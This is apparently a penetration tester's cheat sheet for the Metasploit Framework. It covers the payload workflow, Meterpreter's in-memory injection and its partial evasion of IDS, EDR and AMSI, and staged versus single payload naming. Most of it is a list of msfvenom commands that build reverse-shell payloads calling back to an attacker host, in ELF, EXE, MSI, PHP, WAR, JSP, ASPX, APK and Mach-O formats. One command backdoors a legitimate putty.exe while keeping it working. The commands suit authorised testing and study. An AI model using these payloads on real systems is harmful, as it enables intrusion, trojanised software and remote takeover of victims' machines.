Metasploit Framework

  1. Generate the payload with msfvenom.
  2. Deliver the payload to the target.
  3. Set up a handler in msfconsole using exploit/multi/handler to catch the incoming connection.
  4. Execute the payload on the target.
  5. Interact with the resulting session.

Meterpreter​

search type:payload meterpreter

In-Memory Execution: It does not write itself to disk. Payload is injected into an existing running process with a technique called reflective DLL injection, which loads a DLL directly into process memory without registering it through the operating system's normal module-loading API.

Encrypted Communication: All traffic is encrypted. May use TLS (HTTPS-based meterpreters) or AES (TCP-based).

Both helps with IDS and IPS evasion, but its not bullet proof. Modern EDRs can find it by monitoring process activity patterns and memory scans for known signatures. Windows AMSI 'can' ( ;D ) also detect it.

msfvenom​

  • Singles (inline): Self-contained. The entire payload is delivered in a single package. Larger, but more reliable; no second download.
  • Stagers: Small, lightweight payloads that establish a communication channel between the attacker and the target. Once connected, the stager downloads the second component.
  • Stages: Larger payload components downloaded by a stager.

Together, a stager and its stage form a staged payload.

Naming Convention:

  • windows/x64/shell_reverse_tcp -> single, uses _
  • windows/x64/shell/reverse_tcp -> staged, uses /

Troubleshooting Common Issues​

  • Payload mismatch: Payload must exactly match what was generated with msfvenom, including architecture and staging type.
  • Network configuration: LHOST must be the correct interface IP, not 0.0.0.0 or localhost.
  • Firewall blocking: Make sure attacking machine's firewall allows inbound connections on the specified LPORT.
  • Privilege requirements: Ports below 1024 need sudo.

PrePayloads​

# if you want staged, just change meterpreter_ to meterpreter/
# basic
msfvenom -p <payload> LHOST=<local_ip> LPORT=<local_port> -f <format> -o <output_file>

# linux elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f elf -o evil.elf

# windows exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe -o evil.exe

# windows msi
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f msi -o evil.msi

# php, no meterpreter || UNCOMMENT '<? php' TAG
msfvenom -p php/reverse_php LHOST=<local_ip> LPORT=<local_port> -f raw > evil.php

# python one liner, prints in terminal
msfvenom -p cmd/unix/reverse_python LHOST=<local_ip> LPORT=<local_port> -f raw

# -f c || python || csharp || powershell || hex
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f c

# java (TOMCAT, JENKINS)
msfvenom -p java/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f java

# java war
msfvenom -p java/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f war -o evil.war

# java JSP
msfvenom -p java/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f jsp -o evil.jsp

# asp/aspx || IIS
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f aspx -o evil.aspx

# inject a payload into a binary
# be careful, it breaks signature
# -x <path_to_bin>
# -k -> keep bin function
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -x /root/templates/putty.exe -k -f exe -o evil_putty.exe

# android apk
msfvenom -p android/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -o evil.apk

# macOS || Mach-O
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f macho -o evil.macho
